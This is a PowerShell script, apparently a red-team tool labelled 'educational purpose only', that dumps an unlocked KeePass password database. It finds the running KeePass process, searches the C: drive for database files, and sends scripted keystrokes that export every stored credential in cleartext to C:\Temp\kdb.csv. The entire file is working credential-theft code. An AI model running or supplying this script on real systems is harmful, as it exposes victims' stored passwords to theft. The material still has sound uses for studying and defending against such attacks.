#PowerShell

#==========================
#= Written by lutzenfried =
#==========================
#Use for educational purpose only

#Send interactive key to Keepass process in order to save the unlock database and cleartext password to local file.
#https://msdn.microsoft.com/en-us/library/office/aa202943(v=office.10).aspx : Key shortcut list

#Get-Process KeePass | where {$_.mainWindowTitle} | Format-Table id, name, mainwindowtitle -autosize //Detect the name of the database in window title

Set-Clipboard -Value "C:\Temp\kdb.csv" #Populated clipboard with output file pa

#Launch only if keepass process is detected
$keepass = get-process "KEEPASS" -ErrorAction SilentlyContinue

[string[]] $kdbTab = @(Get-ChildItem -Path C:\ -Filter *.kdb -Recurse -File -Name) #Tab with kdb path of each KDB or KDBX file find on the system C:\ in recursive mode

$kdbTab[0]
$kdbTab[1]

#Make user choice between the array choice.
#Regex to target precise Database.kdbx, precise Keepass file database.

function keepassSender {

    $database = get-process KeePass | select MainWindowTitle
    $titleString = $database | Out-String
    $titleString2 = $titleString | %{$_.split('-')[15]}
    $titleString3 = $titleString2 | %{$_.split(' ')[8]}
    $titleString4 = $titleString3 -replace "`t|`n|`r",""
    $titleString5 = $titleString4 -replace " ;|; ",";"

    $wshell = New-Object -ComObject wscript.shell;
    $wshell.AppActivate($titleString5) #Ensure keepass is running before sending keystrokes

    $wshell.SendKeys('{TAB}')
    Sleep 0.2
    $wshell.SendKeys('~_')
    $wshell.SendKeys('%')
    $wshell.SendKeys('F')
    $wshell.SendKeys('E')
    Sleep 0.8
    $wshell.SendKeys('{TAB}')
    $wshell.SendKeys('{UP}')
    $wshell.SendKeys('{TAB}')
    $wshell.SendKeys('^v')
    $wshell.SendKeys('~_')
    Sleep 0.8
    Set-Clipboard -Value " " #Populated clipboard with blank value

}

if($keepass) {

    echo "`r`n ++++++ Dumping keepass database in CSV format here --> C:\Temp\kdb.csv ++++++"
    keepassSender
    echo "`r`n ++++++ The Keepass database has been DUMP !!! --> C:\Temp\kdb.csv ++++++"
}

else {

    echo "`r`n------ Keepass is not actually running on this host ------"
}
